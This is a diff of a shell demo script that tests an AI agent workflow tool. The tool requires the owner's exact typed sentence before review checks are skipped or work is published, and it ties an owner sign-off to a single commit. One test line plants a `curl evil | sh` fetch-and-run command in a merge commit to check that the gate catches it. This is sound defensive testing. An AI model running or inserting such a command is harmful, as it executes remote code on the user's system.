@@ -179,9 +179,9 @@ echo "working branch now: $(git -C "$M" log --oneline -1 ap-main-demo)"
 
 say "walk 2: a task with target production"
 flowrepo walk2; cd "$M"
-owner_said "fix the total and publish it"            # the owner's words in his own session (a made transcript)
+owner_said "yes, publish p1 to production"            # the one sentence the tool names, typed in his own session (a made transcript)
 echo "-- dispatch: the owner's words that name the publish, verified and stored at todo add"
-"$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "fix the total and publish it"
+"$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "yes, publish p1 to production"
 W="$T/walk2-p1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b p1 "$W" origin/main   # base: origin/<production branch>
 "$P/bin/agent-file.sh" worktree set "$W" p1 working
 printf 'x = 2\n' > "$W/app.py"; git -C "$W" commit -qam "fix the total"; git -C "$W" push -q -u origin p1
@@ -208,8 +208,8 @@ cd "$T"
 say "walk 3: an urgent small production task, done by a fast-lane deputy in an Agent worktree (no worktree line)"
 flowrepo walk3; cd "$M"
 echo "-- dispatch step 2: the todo line with the owner's words that name the publish; base: origin/main"
-owner_said "urgent: fix the total and publish it now"
-"$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "urgent: fix the total and publish it now"
+owner_said "yes, publish u1 to production"
+"$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "yes, publish u1 to production"
 W="$T/walk3-agent-wt"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b u1 "$W" origin/main
 printf 'x = 4\n' > "$W/app.py"; git -C "$W" commit -qam "urgent fix"; git -C "$W" push -q -u origin u1
 for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check u1 "$b" pass --by "u1 Deputy" --evidence demo >/dev/null); done
@@ -241,17 +241,18 @@ if "$P/bin/agent-file.sh" checks gate w4 --dir "$W" --branch w4 --base origin/ma
 fi
 cd "$T"
 
-say "10 FIX ORDER 6: G1-G4 (the owner's words verified for real against his made transcript)"
+say "10 FIX ORDERS 6 and 10: G1-G3, H1, H2 (the owner's words verified for real against his made transcript)"
 flowrepo order6; cd "$M"
 "$P/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
-owner_said "skip the review for this one"; owner_said "please fix the footer typo on the site"
-owner_said "skip the related tests for this one"
+owner_said "yes, skip PR REVIEW for g"; owner_said "please fix the footer typo on the site"
+owner_said "skip the related tests for this one"; owner_said "yes, skip RELATED TESTS for g"
 echo "-- G1: PR REVIEW is never removed:"
-"$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the review for this one"; echo "exit $?"
-echo "-- G1: words that do not name the block do not remove it:"
+"$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "yes, skip PR REVIEW for g"; echo "exit $?"
+echo "-- H2: any sentence but the exact one is refused, and the exact one is printed to ask him for:"
 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
-echo "-- G1: words that name it and leaving it out do:"
 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
+echo "-- H2: the exact sentence he typed removes it:"
+"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "yes, skip RELATED TESTS for g"; echo "exit $?"
 echo "-- G2: the removal ends with its task (todo done, then the same name again):"
 "$P/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
 "$P/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
@@ -266,8 +267,15 @@ git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" a
 git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
 git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
 "$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
-echo "-- G4: target production needs words that name the publish:"
-"$P/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "please fix the footer typo on the site"; echo "exit $?"
+echo "-- H2: target production needs his exact sentence (a natural one is refused and the sentence printed):"
+owner_said "publish it next week"
+"$P/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "publish it next week"; echo "exit $?"
+echo "-- H1: an owner sign on an earlier commit does not cover a later one:"
+"$P/bin/agent-file.sh" todo checks g "OWNER SIGN" >/dev/null
+owner_said "yes, drop the column legacy_note"
+"$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --commit "$(git -C "$M" rev-parse HEAD)" >/dev/null
+printf 'x = 5\n' > "$M/app.py"; git -C "$M" commit -qam "drops another column"; git -C "$M" push -q origin g
+"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "OWNER SIGN|GATE"
 cd "$T"
 
 say "done: everything above ran in $T (delete it when read)"
